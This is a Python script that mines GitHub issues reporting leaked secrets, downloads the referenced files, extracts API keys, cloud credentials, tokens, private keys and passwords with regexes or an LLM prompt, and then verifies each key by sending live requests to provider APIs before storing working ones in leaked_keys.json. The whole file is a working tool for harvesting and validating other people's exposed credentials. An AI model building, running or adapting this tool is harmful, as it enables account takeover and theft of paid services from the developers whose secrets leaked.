import argparse
import json
import os
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import httpx
import json5
from dotenv import load_dotenv
from openai import (
    APIStatusError,
    AuthenticationError,
    OpenAI,
    RateLimitError,
)

DATA_FILE = Path("leaked_keys.json")

KEY_PATTERNS: list[tuple[str, str]] = [
    (r"sk-[a-zA-Z0-9]{20,}", "OpenAI API Key"),
    (r"sk-[a-zA-Z0-9]{32}T3BlbkFJ[a-zA-Z0-9]{32}", "OpenAI API Key (v2)"),
    (r"AIza[0-9A-Za-z_-]{35}", "Google API Key"),
    (r"AKIA[0-9A-Z]{16}", "AWS Access Key ID"),
    (r"(?i)(?:aws_access_key_id|aws_secret_access_key)\s*=\s*\S+", "AWS Credential"),
    (r"ghp_[a-zA-Z0-9]{36}", "GitHub Personal Access Token"),
    (r"gho_[a-zA-Z0-9]{36}", "GitHub OAuth Access Token"),
    (r"ghu_[a-zA-Z0-9]{36}", "GitHub User-to-Server Token"),
    (r"ghs_[a-zA-Z0-9]{36}", "GitHub Server-to-Server Token"),
    (r"ghr_[a-zA-Z0-9]{36}", "GitHub Refresh Token"),
    (r"xox[baprs]-[a-zA-Z0-9-]{10,}", "Slack Token"),
    (r"sk_live_[0-9a-zA-Z]{24,}", "Stripe Secret Key (Live)"),
    (r"pk_live_[0-9a-zA-Z]{24,}", "Stripe Publishable Key (Live)"),
    (r"rk_live_[0-9a-zA-Z]{24,}", "Stripe Restricted Key (Live)"),
    (r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----", "Private Key"),
    (r"-----BEGIN CERTIFICATE-----", "Certificate"),
    (r"-----BEGIN PGP PRIVATE KEY BLOCK-----", "PGP Private Key"),
    (r"(?i)(?:mongodb\+srv|mongodb)://[^\s'\"<>]+", "MongoDB Connection String"),
    (r"https?://hooks\.slack\.com/services/[A-Za-z0-9/]{40,}", "Slack Webhook"),
    (
        r"https?://[^\s'\"<>]+\.s3\.amazonaws\.com/[^\s'\"<>]*\.(?:pem|key|cred|credentials)",
        "S3 URL with Credential File",
    ),
    (
        r"https?://[^\s'\"<>]+\.compute[-.]amazonaws\.com/[^\s'\"<>]*\.(?:pem|key)",
        "EC2 Key Pair URL",
    ),
    (
        r"(?i)(?:password|passwd|pwd)\s*[:=]\s*['\"][^'\"]{8,}['\"]",
        "Hardcoded Password",
    ),
    (r"(?i)(?:api[_-]?key|apikey)\s*[:=]\s*['\"][^'\"]+['\"]", "API Key (Generic)"),
    (r"(?i)(?:secret|token)\s*[:=]\s*['\"][^'\"]{8,}['\"]", "Secret/Token (Generic)"),
    (r"AAAA[0-9A-Za-z_-]{40,}", "Generic Long Token"),
]


def load_saved_keys() -> set[str]:
    if DATA_FILE.exists():
        raw = DATA_FILE.read_text()
        try:
            data = json.loads(raw)
            if isinstance(data, list):
                return {entry["key"] for entry in data if "key" in entry}
        except (json.JSONDecodeError, TypeError):
            return set()
    return set()


def save_key(entry: dict) -> None:
    data: list[dict] = []
    if DATA_FILE.exists():
        raw = DATA_FILE.read_text()
        try:
            data = json.loads(raw) or []
        except (json.JSONDecodeError, TypeError):
            data = []
    key = entry["key"]
    data = [e for e in data if e.get("key") != key]
    data.append(entry)
    DATA_FILE.write_text(json.dumps(data, indent=2, ensure_ascii=False))


def extract_file_url(body: str) -> str | None:
    for line in body.strip().splitlines():
        line = line.strip()
        if line.startswith("https://github.com/") and "/blob/" in line:
            return line
    return None


def file_url_to_raw(url: str) -> str:
    return url.replace(
        "https://github.com/", "https://raw.githubusercontent.com/"
    ).replace("/blob/", "/")


PLACEHOLDER_SUBSTRINGS = {
    "你的",
    "your_key",
    "your-key",
    "yourkey",
    "123456",
    "abcd",
    "example",
    "changeme",
    "change_me",
    "change-me",
    "xxxxx",
    "test",
    "placeholder",
    "fake",
    "dummy",
    "sample",
    "foobar",
    "barfoo",
}


def is_valid_key(key: str) -> bool:
    lower = key.lower()
    for sub in PLACEHOLDER_SUBSTRINGS:
        if sub in lower:
            return False
    return True


def extract_field(content: str, patterns: list[str]) -> str | None:
    for pat in patterns:
        m = re.search(pat, content)
        if m:
            return m.group(1)
    return None


MODEL_PATTERNS = [
    r"""(?i)(?:model|model_name)\s*[:=]\s*['"]([a-zA-Z0-9_.-]+)['"]""",
    r"""(?i)(?:model|model_name)\s*[:=]\s*"([^"]+)""",
    r"""(?i)(?:model|model_name)\s*[:=]\s*'([^']+)'""",
    r"""(?i)^\s*model\s*=\s*(\S+)""",
    r"""(?i)^\s*MODEL\s*=\s*(\S+)""",
]

BASE_URL_PATTERNS = [
    r"""(?i)(?:base_url|api_base|base-url|api_base_url|openai_base_url)\s*[:=]\s*['"](https?://[^'"]+)['"]""",
    r"""(?i)^\s*(?:BASE_URL|API_BASE|OPENAI_BASE_URL)\s*=\s*(\S+)""",
]

CHAT_MODEL_KEYWORDS = [
    "gpt",
    "chat",
    "o1",
    "o3",
    "o4",
    "claude",
    "gemini",
    "gemma",
    "llama",
    "mistral",
    "codestral",
    "ministral",
    "qwen",
    "deepseek",
    "command",
    "phi",
    "mixtral",
    "nemotron",
    "dbrx",
    "cohere",
    "aya",
    "minicpm",
    "glm",
    "ernie",
    "doubao",
    "yi-",
    "baichuan",
    "internlm",
    "falcon",
    "grok",
    "wizard",
    "vicuna",
    "solar",
    "reka",
    "stablelm",
]
NON_CHAT_KEYWORDS = [
    "embedding",
    "davinci",
    "babbage",
    "curie",
    "ada",
    "whisper",
    "tts",
    "dall-e",
    "moderation",
    "instruct",
    "realtime",
]


def _pick_chat_model(models) -> str | None:
    candidates = []
    for m in models:
        mid = m.id.lower()
        if any(kw in mid for kw in NON_CHAT_KEYWORDS):
            continue
        if any(kw in mid for kw in CHAT_MODEL_KEYWORDS):
            candidates.append(m.id)
    if not candidates:
        for m in models:
            mid = m.id.lower()
            if any(kw in mid for kw in NON_CHAT_KEYWORDS):
                continue
            candidates.append(m.id)
    return candidates[0] if candidates else None


def _raw_body(e: APIStatusError) -> str:
    raw = e.body
    if isinstance(raw, dict):
        return json.dumps(raw, ensure_ascii=False)
    return str(raw or "")


def _classify_status(e: APIStatusError) -> str:
    status = e.status_code
    msg = _raw_body(e).lower()

    if status == 402:
        return "out_of_balance"
    if status == 401:
        return "invalid"
    if status == 429:
        if "quota" in msg or "insufficient_quota" in msg:
            return "out_of_quota"
        return "rate_limited"
    return "valid"


def verify_key(api_key: str, base_url: str, model_name: str | None) -> tuple[str, str]:
    client = OpenAI(
        api_key=api_key,
        base_url=base_url.rstrip("/") + "/v1",
        max_retries=0,
        timeout=15,
    )

    if not model_name:
        try:
            models = client.models.list()
            model_name = _pick_chat_model(models)
        except AuthenticationError as e:
            return "invalid", _raw_body(e)
        except RateLimitError as e:
            body = _raw_body(e)
            if "quota" in body.lower():
                return "out_of_quota", body
            return "rate_limited", body
        except APIStatusError as e:
            return _classify_status(e), _raw_body(e)
        except Exception as e:
            return "error", str(e)

    if not model_name:
        return "error", ""

    try:
        client.chat.completions.create(
            model=model_name,
            messages=[{"role": "user", "content": "hi"}],
            max_tokens=1,
        )
        return "valid", ""
    except AuthenticationError as e:
        return "invalid", _raw_body(e)
    except RateLimitError as e:
        body = _raw_body(e)
        if "quota" in body.lower():
            return "out_of_quota", body
        return "rate_limited", body
    except APIStatusError as e:
        return _classify_status(e), _raw_body(e)
    except Exception as e:
        return "error", str(e)


PROVIDER_MAP: list[tuple[set[str], str]] = [
    ({"chatgpt", "openai"}, "https://api.openai.com/v1"),
    ({"azure"}, "https://<resource>.openai.azure.com"),
    ({"anthropic", "claude"}, "https://api.anthropic.com/v1"),
    ({"google", "gemini"}, "https://generativelanguage.googleapis.com/v1"),
    ({"groq"}, "https://api.groq.com/openai/v1"),
    ({"together"}, "https://api.together.xyz/v1"),
    ({"fireworks"}, "https://api.fireworks.ai/inference/v1"),
    ({"深度求索", "deepseek"}, "https://api.deepseek.com/v1"),
    ({"mistral"}, "https://api.mistral.ai/v1"),
    ({"openrouter"}, "https://openrouter.ai/api/v1"),
    ({"ollama"}, "http://localhost:11434/v1"),
    ({"perplexity"}, "https://api.perplexity.ai"),
    ({"cohere"}, "https://api.cohere.ai/v1"),
    ({"x.ai", "xai", "grok"}, "https://api.x.ai/v1"),
    (
        {"火山引擎", "火山方舟", "volcengine", "ark", "豆包", "doubao"},
        "https://ark.cn-beijing.volces.com/api/v3",
    ),
    (
        {
            "百度千帆",
            "百度智能云",
            "qianfan",
            "ernie",
            "百度文心",
            "文心一言",
            "wenxin",
        },
        "https://qianfan.baidubce.com/v2",
    ),
    (
        {"阿里百炼", "阿里云", "dashscope", "千问", "qwen"},
        "https://dashscope.aliyuncs.com/compatible-mode/v1",
    ),
    (
        {"智谱", "zhipu", "bigmodel", "glm", "chatglm"},
        "https://open.bigmodel.cn/api/paas/v4",
    ),
    (
        {"硅基流动", "siliconflow"},
        "https://api.siliconflow.cn/v1",
    ),
    (
        {"nvidia", "nim"},
        "https://integrate.api.nvidia.com/v1",
    ),
    (
        {"cerebras"},
        "https://api.cerebras.ai/v1",
    ),
    (
        {"huggingface", "hugging face"},
        "https://api-inference.huggingface.co/models",
    ),
    (
        {"modelscope", "魔搭"},
        "https://api-inference.modelscope.cn/v1",
    ),
    (
        {"moonshot", "kimi", "月之暗面"},
        "https://api.moonshot.cn/v1",
    ),
    (
        {"minimax"},
        "https://api.minimax.chat/v1",
    ),
    (
        {"deepinfra"},
        "https://api.deepinfra.com/v1/openai",
    ),
    (
        {"hyperbolic"},
        "https://api.hyperbolic.xyz/v1",
    ),
    (
        {"github models", "github"},
        "https://models.inference.ai.azure.com",
    ),
    (
        {"llama", "meta"},
        "https://api.llama-api.com/chat/completions",
    ),
    (
        {"cloudflare"},
        "https://api.cloudflare.com/client/v4/accounts/{account_id}/ai/run",
    ),
    (
        {"sambanova", "samba"},
        "https://api.sambanova.ai/v1",
    ),
    (
        {"ai21"},
        "https://api.ai21.com/studio/v1",
    ),
    (
        {"replicate"},
        "https://api.replicate.com/v1",
    ),
    (
        {"lepton"},
        "https://<workspace>.lepton.ai/api/v1",
    ),
    (
        {"anyscale"},
        "https://api.endpoints.anyscale.com/v1",
    ),
    (
        {"arcee", "arcee ai"},
        "https://api.arcee.ai/api/v1",
    ),
    (
        {"novita"},
        "https://api.novita.ai/openai",
    ),
    (
        {"parasail"},
        "https://api.parasail.io/v1",
    ),
    (
        {"recraft"},
        "https://external.api.recraft.ai/v1",
    ),
    (
        {"streamlake", "kuaishou", "kwai", "wanqing", "vanchin"},
        "https://vanchin.streamlake.ai/api/gateway/v1/endpoints",
    ),
    (
        {"baseten"},
        "https://inference.baseten.co/v1",
    ),
]

CONTEXT_WINDOW = 30

LLM_KEYWORDS: set[str] = set()
for _kw_set, _ in PROVIDER_MAP:
    for kw in _kw_set:
        LLM_KEYWORDS.add(kw.lower())
for _pfx in (
    "sk-",
    "AIza",
    "AKIA",
    "ghp_",
    "gho_",
    "ghu_",
    "ghs_",
    "ghr_",
    "xoxb-",
    "xoxp-",
    "xoxa-",
    "xoxr-",
    "xoxs-",
    "sk_live_",
    "pk_live_",
    "rk_live_",
    "-----BEGIN",
    "mongodb+srv://",
    "mongodb://",
    "hooks.slack.com",
    "s3.amazonaws.com",
    "password",
    "passwd",
    "pwd",
    "api_key",
    "apikey",
    "secret",
    "token",
    "api_key",
    "api-key",
):
    LLM_KEYWORDS.add(_pfx.lower())

_CONTEXT_WORDS = {"model", "base", "url", "key", "api", "secret", "token", "password"}


def _ext_keywords() -> set[str]:
    return LLM_KEYWORDS


LLM_BASE_PROMPT = """You are analyzing a configuration file that may contain api keys, model names, and base urls for llm providers.

extract all api keys from the file along with their associated model name and base url.

for each key found, return:
- "key": the full api key string
- "key_type": what kind of key (e.g. "LLM API Key", "AWS Access Key", "GitHub Token", "Slack Token", "Stripe Key", "Private Key", "MongoDB URI", "Generic Secret", etc.)
- "model_name": the model name if configured nearby (e.g. "gpt-4", "claude-3", "glm-5", "deepseek-chat"), or "" if none
- "base_url": the base url if configured or can be inferred from the provider name, or "" if none

if only a provider name is mentioned and the base url is not explicitly set, infer it from these known providers:
"""

LLM_PROMPT_TAIL = """
- return ONLY a json array of objects. no markdown, no backticks, no explanation.
- if nothing is found, return an empty array [].
- the file content below may be truncated — only extract keys that are actually present.

file content:
"""


def _parse_llm_json(text: str):
    text = text.strip()
    if text.startswith("```"):
        for prefix in ("```json\n", "```jsonl\n", "```"):
            if text.startswith(prefix):
                text = text[len(prefix) :]
                break
        if text.endswith("```"):
            text = text[:-3]
    text = text.strip()
    data = json5.loads(text)
    if isinstance(data, dict):
        return [data]
    if isinstance(data, list):
        return data
    return []


def _build_provider_lines(content: str) -> str:
    content_lower = content.lower()
    lines = []
    for keywords, url in PROVIDER_MAP:
        for kw in keywords:
            if kw.lower() in content_lower:
                names = " / ".join(f'"{k}"' for k in keywords)
                lines.append(f'  - {names} -> "{url}"')
                break
    if not lines:
        lines.append("  (no provider name detected)")
    return "\n".join(lines)


def _file_ext(url: str) -> str:
    path = url.rstrip("/")
    if "/blob/" in path:
        path = path.split("/blob/", 1)[1]
        parts = path.split("/", 1)
        if len(parts) > 1:
            path = parts[1]
        else:
            return ""
    dot = path.rfind(".")
    return path[dot:].lower() if dot != -1 else ""


def _strip_md(text: str) -> str:
    text = re.sub(r"```[\s\S]*?```", "", text)
    text = re.sub(r"`[^`]*`", "", text)
    text = re.sub(r"!\[.*?\]\(.*?\)", "", text)
    text = re.sub(r"\[([^\]]*)\]\(.*?\)", r"\1", text)
    text = re.sub(r"^#+\s*", "", text, flags=re.MULTILINE)
    text = re.sub(r"\*{1,3}([^*]+)\*{1,3}", r"\1", text)
    text = re.sub(r"_{1,3}([^_]+)_{1,3}", r"\1", text)
    text = re.sub(r"^[-*_]{3,}\s*$", "", text, flags=re.MULTILINE)
    text = re.sub(r"^>\s*", "", text, flags=re.MULTILINE)
    return text


def _keep_context(text: str, window: int = CONTEXT_WINDOW) -> str:
    low = text.lower()
    spans: list[tuple[int, int]] = []
    for kw in _ext_keywords():
        start = 0
        while True:
            idx = low.find(kw, start)
            if idx == -1:
                break
            left = max(0, idx - window)
            right = min(len(text), idx + len(kw) + window)
            spans.append((left, right))
            start = idx + 1
    if not spans:
        return ""
    spans.sort()
    merged: list[tuple[int, int]] = [spans[0]]
    for l, r in spans[1:]:
        if l <= merged[-1][1]:
            merged[-1] = (merged[-1][0], max(merged[-1][1], r))
        else:
            merged.append((l, r))
    return "\n".join(text[l:r] for l, r in merged)


def _filter_structured(data, context_words):
    if isinstance(data, dict):
        if any(any(w in k.lower() for w in context_words) for k in data):
            return data
        result = {}
        for k, v in data.items():
            if isinstance(v, (dict, list)):
                filtered = _filter_structured(v, context_words)
                if filtered is not None:
                    result[k] = filtered
        return result if result else None
    if isinstance(data, list):
        result = []
        for item in data:
            if isinstance(item, (dict, list)):
                filtered = _filter_structured(item, context_words)
                if filtered is not None:
                    result.append(filtered)
        return result if result else None
    return None


def preprocess_content(content: str, file_url: str) -> str | None:
    ext = _file_ext(file_url)

    # 1. markdown
    if ext in (".md", ".markdown", ".mdown", ".mkd", ".mkdown"):
        stripped = _strip_md(content)
        result = _keep_context(stripped)
        return result if result else None

    # 2. json / yaml / toml
    if ext in (".json", ".yaml", ".yml", ".toml"):
        try:
            if ext == ".toml":
                import tomllib

                data = tomllib.loads(content)
            elif ext in (".yaml", ".yml"):
                import yaml

                data = yaml.safe_load(content)
            else:
                data = json.loads(content)
        except Exception:
            return _keep_context(content) or None
        filtered = _filter_structured(data, _CONTEXT_WORDS)
        if filtered is None:
            return None
        return json.dumps(filtered, indent=2, ensure_ascii=False)

    # 3. simple kv pairs (ini / env / conf)
    if ext in (".ini", ".env", ".cfg", ".conf", ".properties") or ".env" in ext:
        lines: list[str] = []
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#") or line.startswith(";"):
                continue
            if "=" in line:
                k = line.split("=", 1)[0].strip().lower()
                if any(w in k for w in _CONTEXT_WORDS):
                    lines.append(line)
        return "\n".join(lines) if lines else None

    # 4. plain text
    if ext in (".txt", ".text", ""):
        return _keep_context(content) or None

    # 5. unknown — skip
    print(f"  warning: unknown file type '{ext}', skipping")
    return None


def llm_extract_all(
    content: str,
    llm_base_url: str,
    llm_model: str,
    llm_api_key: str,
    reasoning_mode: str = "off",
) -> list[dict[str, str]]:
    client = OpenAI(base_url=llm_base_url, api_key=llm_api_key, timeout=30)
    try:
        import tiktoken

        provider_hints = _build_provider_lines(content)
        prompt_text = (
            LLM_BASE_PROMPT + provider_hints + "\n" + LLM_PROMPT_TAIL + content
        )
        print(f"  prompt length: {len(prompt_text)}")
        try:
            enc = tiktoken.encoding_for_model(llm_model)
        except Exception:
            enc = tiktoken.get_encoding("cl100k_base")
        token_count = len(enc.encode(prompt_text))
        print(f"  estimated token count: ~{token_count}")
        kwargs: dict = {
            "model": llm_model,
            "messages": [
                {
                    "role": "user",
                    "content": prompt_text,
                }
            ],
            "temperature": 0,
            "max_tokens": 1500,
            "extra_body": {"thinking": {"type": "disabled"}},
        }
        if reasoning_mode != "off":
            kwargs["reasoning_effort"] = reasoning_mode
            kwargs["extra_body"] = {"thinking": {"type": "enabled"}}
        resp = client.chat.completions.create(**kwargs)
        text = (resp.choices[0].message.content or "").strip()
        return _parse_llm_json(text)  # type: ignore[return-value]
    except Exception as e:
        print(f"    llm scan failed: {e}", file=sys.stderr)
        return []


def extract_keys(content: str) -> list[tuple[str, str]]:
    found: list[tuple[str, str]] = []
    for pattern, name in KEY_PATTERNS:
        for m in re.finditer(pattern, content):
            found.append((m.group(), name))
    return found


def process_issue(
    issue: dict,
    saved_keys: set[str],
    lock: threading.Lock,
    ignore_saved: bool = False,
    llm_scan: bool = False,
    llm_base_url: str = "",
    llm_model: str = "",
    llm_api_key: str = "",
    llm_reasoning_mode: str = "off",
) -> tuple[int, int]:
    repo_url: str = issue["repository_url"]
    parts = repo_url.rstrip("/").split("/")
    owner = parts[-2]
    repo_name = parts[-1]

    body: str = issue.get("body") or ""
    file_url = extract_file_url(body)
    if not file_url:
        print("error: failed to extract file url")
        return 0, 0

    print(f"\nFile URL: {file_url}")

    raw_url = file_url_to_raw(file_url)
    try:
        resp = httpx.get(raw_url, timeout=30.0)
    except httpx.HTTPError as e:
        print(f"  Network error: {e}")
        return 0, 0
    if resp.status_code != 200:
        print(f"  Could not read file (HTTP {resp.status_code})")
        return 0, 0

    content = resp.text

    if llm_scan:
        preprocessed = preprocess_content(content, file_url)
        if preprocessed is None:
            print("  No relevant content after preprocessing.")
            return 0, 0
        result = llm_extract_all(
            preprocessed, llm_base_url, llm_model, llm_api_key, llm_reasoning_mode
        )
        if not result:
            print("  LLM found nothing.")
            return 0, 0
        processed = 0
        skipped = 0
        for item in result:
            key_value = (item.get("key") or "").strip()
            key_type = (item.get("key_type") or "Unknown").strip()
            model_name = (item.get("model_name") or "").strip()
            base_url = (item.get("base_url") or "").strip()

            if not key_value:
                continue
            if not is_valid_key(key_value):
                print("  Found invalid key")
                skipped += 1
                continue
            print(f"  Found: [{key_type}] {key_value}")
            if model_name:
                print(f"    model_name: {model_name}")
            if base_url:
                print(f"    base_url:  {base_url}")

            valid_type = ""
            validation_result = ""
            if base_url:
                valid_type, validation_result = verify_key(
                    key_value, base_url, model_name
                )
                print(f"    verification: {valid_type}")

            with lock:
                if not ignore_saved and key_value in saved_keys:
                    skipped += 1
                    continue
                entry = {
                    "key": key_value,
                    "key_type": key_type,
                    "repo_owner": owner,
                    "repo_name": repo_name,
                    "file_url": file_url,
                    "valid_type": valid_type,
                    "validation_result": validation_result,
                }
                if model_name:
                    entry["model_name"] = model_name
                if base_url:
                    entry["base_url"] = base_url
                save_key(entry)
                saved_keys.add(key_value)
            processed += 1
        return processed, skipped

    keys = extract_keys(content)
    if not keys:
        print("  No keys found in file.")
        return 0, 0

    model_name = extract_field(content, MODEL_PATTERNS)
    base_url = extract_field(content, BASE_URL_PATTERNS)
    processed = 0
    skipped = 0

    for key_value, key_type in keys:
        if not is_valid_key(key_value):
            print("  Found invalid key")
            skipped += 1
            continue
        print(f"  Found: [{key_type}] {key_value}")
        if model_name:
            print(f"    model_name: {model_name}")
        if base_url:
            print(f"    base_url:  {base_url}")

        valid_type = ""
        validation_result = ""
        if base_url:
            valid_type, validation_result = verify_key(key_value, base_url, model_name)
            print(f"    verification: {valid_type}")

        with lock:
            if not ignore_saved and key_value in saved_keys:
                skipped += 1
                continue
            entry = {
                "key": key_value,
                "key_type": key_type,
                "repo_owner": owner,
                "repo_name": repo_name,
                "file_url": file_url,
                "valid_type": valid_type,
                "validation_result": validation_result,
            }
            if model_name:
                entry["model_name"] = model_name
            if base_url:
                entry["base_url"] = base_url
            save_key(entry)
            saved_keys.add(key_value)
        processed += 1

    return processed, skipped


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--ignore-saved", action="store_true", help="Re-verify and overwrite saved keys"
    )
    parser.add_argument(
        "--llm-scan",
        action="store_true",
        help="Use LLM to extract model/base_url from leaked files",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Disable concurrency and sleep 5s after each issue",
    )
    args = parser.parse_args()

    load_dotenv()

    token = os.environ.get("GITHUB_API_KEY", "").strip()
    if not token:
        print("error: GITHUB_API_KEY is not set", file=sys.stderr)
        sys.exit(1)

    llm_base_url = os.environ.get("LLM_BASE_URL", "").strip()
    llm_api_key = os.environ.get("LLM_API_KEY", "").strip()
    llm_model_name = os.environ.get("LLM_MODEL_NAME", "").strip()
    llm_reasoning_mode = os.environ.get("LLM_REASONING_MODE", "off").strip().lower()
    if llm_reasoning_mode not in ("off", "low", "medium", "high", "xhigh", "max"):
        print(
            f"warning: unknown reasoning mode '{llm_reasoning_mode}', defaulting to 'off'"
        )
        llm_reasoning_mode = "off"

    missing: list[str] = []
    if not llm_base_url:
        missing.append("LLM_BASE_URL")
    if not llm_api_key:
        missing.append("LLM_API_KEY")
    if not llm_model_name:
        missing.append("LLM_MODEL_NAME")
    if not llm_reasoning_mode:
        missing.append("LLM_REASONING_MODE")
    if missing:
        print(
            f"error: --llm-scan requires {', '.join(missing)} in .env",
            file=sys.stderr,
        )
        sys.exit(1)

    saved_keys = load_saved_keys()
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github.v3+json",
    }

    total_processed = 0
    total_skipped = 0
    page = 1
    lock = threading.Lock()

    with httpx.Client(headers=headers, timeout=30.0) as client:
        while True:
            resp = client.get(
                "https://api.github.com/search/issues",
                params={"q": "your key leak is:issue", "per_page": 100, "page": page},
            )
            if resp.status_code == 422 and page > 10:
                break
            if resp.status_code == 403:
                print("Rate limited. Waiting 60s...", file=sys.stderr)
                import time

                time.sleep(60)
                continue
            resp.raise_for_status()
            data = resp.json()
            batch = data.get("items", [])
            if not batch:
                break

            print(f"\n--- Page {page} ({len(batch)} issues) ---")
            if args.debug:
                for issue in batch:
                    p, s = process_issue(
                        issue,
                        saved_keys,
                        lock,
                        args.ignore_saved,
                        args.llm_scan,
                        llm_base_url,
                        llm_model_name,
                        llm_api_key,
                        llm_reasoning_mode,
                    )
                    total_processed += p
                    total_skipped += s
                    import time

                    time.sleep(5)
            else:
                with ThreadPoolExecutor(max_workers=10) as executor:
                    futures = [
                        executor.submit(
                            process_issue,
                            issue,
                            saved_keys,
                            lock,
                            args.ignore_saved,
                            args.llm_scan,
                            llm_base_url,
                            llm_model_name,
                            llm_api_key,
                            llm_reasoning_mode,
                        )
                        for issue in batch
                    ]
                    for f in as_completed(futures):
                        p, s = f.result()
                        total_processed += p
                        total_skipped += s

            if len(batch) < 100:
                break
            page += 1

    print(
        f"\nDone. Processed {total_processed} new key(s), skipped {total_skipped} already-saved key(s)."
    )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupted.", file=sys.stderr)
        sys.exit(130)
